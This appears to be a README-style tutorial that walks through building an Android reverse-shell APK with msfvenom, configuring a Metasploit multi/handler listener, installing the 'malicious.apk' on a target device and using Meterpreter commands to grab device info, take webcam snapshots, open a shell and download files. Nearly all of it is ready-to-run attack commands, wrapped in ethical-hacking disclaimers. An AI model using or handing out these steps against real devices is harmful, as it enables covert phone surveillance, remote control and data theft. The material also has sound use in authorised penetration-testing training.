# Android Reverse Shell: Meterpreter Control

## 📌 Description  
This project demonstrates how to create an **Android reverse shell** using `msfvenom` and **Metasploit**. The generated APK allows an attacker to gain remote control of the target device when executed.

⚠️ **Disclaimer:** This project is for **educational and ethical hacking purposes only**. Unauthorized use is illegal. Only test in a controlled environment with permission.

---

## 🛠 Test Environment  
This project has been tested on the following setup:  

| Component            | Details                               |
|----------------------|---------------------------------------|
| **Attacker Machine** | Kali Linux 2024.1 (Virtual Machine)  |
| **Target Device**    | Android 10 (Emulator & Physical)     |
| **Metasploit Version** | v6.3.10                            |
| **Network Setup**    | Local Network (LAN)                  |
| **Testing Emulator** | Genymotion & Android Studio Emulator |

---

## 🚀 Steps to Set Up and Execute  

### **Step 1: Generate the Reverse Shell APK**  
Open a terminal and run:  
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.69.129 LPORT=4444 -o malicious.apk
```
- `-p android/meterpreter/reverse_tcp` → Specifies the payload for Android.  
- `LHOST=192.168.69.129` → Your attacker's IP address.  
- `LPORT=4444` → Listening port for the reverse connection.  
- `-o malicious.apk` → Saves the APK file.  

---

### **Step 2: Setup Metasploit Listener**  
Launch `msfconsole`:  
```bash
msfconsole -q
```
Then configure the listener:  
```bash
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.69.129
set LPORT 4444
exploit
```
- `use exploit/multi/handler` → Enables the Metasploit listener.  
- `set payload android/meterpreter/reverse_tcp` → Matches the APK payload.  
- `set LHOST` and `set LPORT` → Ensure they match the payload settings.  
- `exploit` → Starts listening for incoming connections.  

---

### **Step 3: Install and Execute the APK on Target Device**  
- Transfer `malicious.apk` to the target device.  
- Install it manually (`adb install malicious.apk` or direct installation).  
- Once opened, the device will connect back to the attacker's machine.  

---

### **Step 4: Gain Meterpreter Access**  
Once the target device executes the APK, you’ll get a **Meterpreter session**:  
```bash
meterpreter >
```
Now, you can execute various commands:  
- `sysinfo` → Get device information.  
- `webcam_snap` → Take a snapshot using the front camera.  
- `shell` → Open a command shell on the device.  
- `download <file>` → Download a file from the target device.
  
---

## ⚠️ Legal Disclaimer  
This project is intended for **ethical hacking and penetration testing** only. **Unauthorized use is strictly prohibited.**  

---

🔗 **Follow for more security research and ethical hacking projects!** 🚀
